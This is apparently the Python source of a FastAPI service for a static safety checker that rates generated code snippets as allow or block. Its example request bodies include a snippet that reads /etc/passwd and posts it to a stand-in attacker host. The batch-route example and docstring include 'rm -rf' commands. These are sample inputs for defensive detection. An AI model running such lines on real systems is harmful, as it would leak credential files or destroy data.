"""CodeGuard HTTP service.

Routes:

* ``POST /check``      - JSON envelope ``{"code": "..."}``
* ``POST /check/raw``  - the snippet itself as the body (``text/plain``)
* ``POST /batch``      - JSON array of ``{"code": "..."}`` objects
* ``POST /batch/raw``  - NUL-separated snippets in one raw body
* ``GET  /health``     - liveness (always open, no auth)

Optional hardening, controlled by environment variables so local development and
tests are unaffected:

* ``CODEGUARD_RATE_LIMIT`` - requests per minute per client (default 600, 0 = off).
* ``CODEGUARD_WARMUP``    - ``0`` disables the startup warm-up.

There is **no authentication**: the service accepts requests from anyone who can
reach it. Bind it to ``127.0.0.1`` or put it behind a trusted network / tunnel with
its own access control before exposing it publicly.
"""

import os
import threading
import time
from contextlib import asynccontextmanager
from typing import List

from fastapi import Depends, FastAPI, HTTPException, Request
from fastapi.responses import JSONResponse

from textcodeguard.guard import guard
from textcodeguard.schema import CheckRequest, CheckResponse

# Same limit as CheckRequest.code (Pydantic max_length), enforced manually on the
# raw routes because there is no Pydantic model to do it there.
MAX_CODE_CHARS = 100_000
# Bounds for batch requests so a single call cannot trigger unbounded work.
MAX_BATCH_ITEMS = 500
MAX_BATCH_CHARS = 1_000_000
# Snippets in a raw batch body are separated by NUL, which cannot appear in source
# text of any supported language (the same convention as `xargs -0`).
RAW_BATCH_SEPARATOR = b"\x00"

RATE_LIMIT_ENV = "CODEGUARD_RATE_LIMIT"
WARMUP_ENV = "CODEGUARD_WARMUP"
DEFAULT_RATE_LIMIT = 600


# --------------------------------------------------------------------------
# In-process rate limiting (fixed window per client, no external dependency)
# --------------------------------------------------------------------------
class _RateLimiter:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._hits: dict[str, list[float]] = {}

    def reset(self) -> None:
        with self._lock:
            self._hits.clear()

    def check(self, key: str, limit: int, window: float = 60.0) -> None:
        if limit <= 0:
            return
        now = time.monotonic()
        with self._lock:
            if len(self._hits) > 10_000:  # keep memory bounded under abuse
                self._hits.clear()
            recent = [t for t in self._hits.get(key, ()) if now - t < window]
            if len(recent) >= limit:
                self._hits[key] = recent
                raise HTTPException(
                    status_code=429,
                    detail=f"rate limit exceeded ({limit} requests/minute)",
                    headers={"Retry-After": "60"},
                )
            recent.append(now)
            self._hits[key] = recent


limiter = _RateLimiter()


def rate_limit_env() -> int:
    raw = os.environ.get(RATE_LIMIT_ENV)
    if raw is None or not raw.strip():
        return DEFAULT_RATE_LIMIT
    try:
        return max(0, int(raw))
    except ValueError:
        return DEFAULT_RATE_LIMIT


def rate_limit(request: Request) -> None:
    forwarded = request.headers.get("x-forwarded-for", "")
    client = (
        forwarded.split(",")[0].strip()
        if forwarded
        else (request.client.host if request.client else "unknown")
    )
    limiter.check(client, rate_limit_env())


# --------------------------------------------------------------------------
# Startup warm-up: pay the model load and first-inference cost before serving
# --------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(_app: FastAPI):
    if os.environ.get(WARMUP_ENV, "1") != "0":
        try:
            from textcodeguard.detect import ml

            ml.ml_status()          # imports sklearn + loads the pipeline
            guard("print('warmup')\n")  # compiles rules, runs one full analysis
        except Exception:  # noqa: BLE001 - warm-up must never prevent startup
            pass
    yield


app = FastAPI(
    title="CodeGuard",
    version="1.1.0",
    description=(
        "Real-time pre-execution safety layer for generated code. Analyses a snippet "
        "statically (rules + Python AST + a classical ML classifier) and returns an "
        "allow/block verdict. Submitted code is never executed."
    ),
    lifespan=lifespan,
)

# Applied to every analysis route.
_PROTECT = [Depends(rate_limit)]


@app.exception_handler(Exception)
async def fail_closed(_request: Request, exc: Exception) -> JSONResponse:
    """Never imply a snippet was cleared when the detector itself failed.

    Returns 503 (a service problem, not a verdict) together with
    ``verdict: "block"`` so a caller that only reads ``verdict`` still fails safe.
    The exception message is not echoed: it could contain submitted source.
    """
    return JSONResponse(
        status_code=503,
        content={
            "detail": "analysis failed; treat this snippet as blocked",
            "verdict": "block",
            "error_type": type(exc).__name__,
        },
    )


_RAW_REQUEST_BODY = {
    "required": True,
    "content": {
        "text/plain": {
            "schema": {"type": "string"},
            "example": (
                "import requests\n\n"
                "with open('/etc/passwd') as fh:\n"
                "    data = fh.read()\n\n"
                "requests.post('http://evil.example/collect', data=data)\n"
            ),
        }
    },
}


@app.post(
    "/check",
    response_model=CheckResponse,
    summary="Analyse one snippet (JSON)",
    dependencies=_PROTECT,
)
def check(req: CheckRequest) -> CheckResponse:
    """Analyse ``req.code`` and return the verdict."""
    return CheckResponse(**guard(req.code))


@app.post(
    "/check/raw",
    response_model=CheckResponse,
    summary="Analyse one snippet (raw text body)",
    openapi_extra={"requestBody": _RAW_REQUEST_BODY},
    dependencies=_PROTECT,
)
async def check_raw(request: Request) -> CheckResponse:
    """Analyse the request body as the snippet itself.

    The body is read verbatim and decoded as UTF-8, so the snippet does not need
    to be JSON-escaped: ``curl --data-binary @generated.py`` works. Any
    content-type is accepted.
    """
    raw = await request.body()
    if len(raw) > MAX_CODE_CHARS:
        raise HTTPException(
            status_code=413,
            detail=f"code exceeds the {MAX_CODE_CHARS}-character limit",
        )

    # A JSON envelope sent to this route would be analysed as *code*, which is
    # almost certainly a mix-up. Point the caller at the right route instead of
    # silently returning a meaningless verdict.
    content_type = request.headers.get("content-type", "")
    if "json" in content_type.lower():
        try:
            import json as _json

            parsed = _json.loads(raw.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            parsed = None
        if isinstance(parsed, dict) and isinstance(parsed.get("code"), str):
            raise HTTPException(
                status_code=400,
                detail=(
                    "This route analyses the raw request body as the snippet. You sent a "
                    'JSON object with a "code" field - use POST /check for that.'
                ),
            )

    code = raw.decode("utf-8", errors="replace")
    if len(code) > MAX_CODE_CHARS:
        raise HTTPException(
            status_code=413,
            detail=f"code exceeds the {MAX_CODE_CHARS}-character limit",
        )
    return CheckResponse(**guard(code))


@app.post(
    "/batch",
    response_model=List[CheckResponse],
    summary="Analyse many snippets (JSON)",
    dependencies=_PROTECT,
)
def batch(reqs: List[CheckRequest]) -> List[CheckResponse]:
    """Analyse a list of snippets in one call; returns one result per input."""
    if len(reqs) > MAX_BATCH_ITEMS:
        raise HTTPException(
            status_code=413,
            detail=f"batch exceeds the {MAX_BATCH_ITEMS}-item limit",
        )
    return [CheckResponse(**guard(r.code)) for r in reqs]


@app.post(
    "/batch/raw",
    response_model=List[CheckResponse],
    summary="Analyse many snippets (raw text, NUL-separated)",
    openapi_extra={
        "requestBody": {
            "required": True,
            "content": {
                "text/plain": {
                    "schema": {"type": "string"},
                    "example": (
                        "print('hello')\x00"
                        "import os\nos.system('rm -rf /tmp/x')"
                    ),
                }
            },
        }
    },
    dependencies=_PROTECT,
)
async def batch_raw(request: Request) -> List[CheckResponse]:
    """Analyse several snippets in one raw body, separated by NUL (``\\x00``).

    NUL is used as the separator because it cannot occur in source text of any
    supported language, so no escaping is needed. A trailing separator is ignored,
    so both ``a\\x00b`` and ``a\\x00b\\x00`` mean two snippets. A body with no
    separator is treated as a single snippet.

        printf 'print(1)\\0import os\\nos.system("rm -rf /")' \\
          | curl -s -X POST localhost:8000/batch/raw --data-binary @-
    """
    raw = await request.body()
    if len(raw) > MAX_BATCH_CHARS:
        raise HTTPException(
            status_code=413,
            detail=f"batch body exceeds the {MAX_BATCH_CHARS}-character limit",
        )

    # A JSON array sent here is a mix-up; point the caller at the right route.
    content_type = request.headers.get("content-type", "")
    if "json" in content_type.lower():
        try:
            import json as _json

            parsed = _json.loads(raw.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            parsed = None
        if isinstance(parsed, list):
            raise HTTPException(
                status_code=400,
                detail=(
                    "This route splits the raw body on NUL (\\x00). You sent a JSON array - "
                    "use POST /batch for that."
                ),
            )

    parts = raw.split(RAW_BATCH_SEPARATOR)
    if len(parts) > 1 and parts[-1] == b"":
        parts.pop()  # ignore a single trailing separator

    if len(parts) > MAX_BATCH_ITEMS:
        raise HTTPException(
            status_code=413,
            detail=f"batch exceeds the {MAX_BATCH_ITEMS}-item limit",
        )

    results = []
    for part in parts:
        code = part.decode("utf-8", errors="replace")
        if len(code) > MAX_CODE_CHARS:
            raise HTTPException(
                status_code=413,
                detail=f"a snippet exceeds the {MAX_CODE_CHARS}-character limit",
            )
        results.append(CheckResponse(**guard(code)))
    return results


@app.get("/health", summary="Liveness check")
def health() -> dict:
    """Return ``{"ok": true}`` when the service is receiving traffic.

    Always open (no API key, no rate limit) so an uptime probe works without
    credentials. By the time this responds, the startup warm-up has completed, so
    the first analysis request is not paying the model-load cost.
    """
    return {"ok": True}
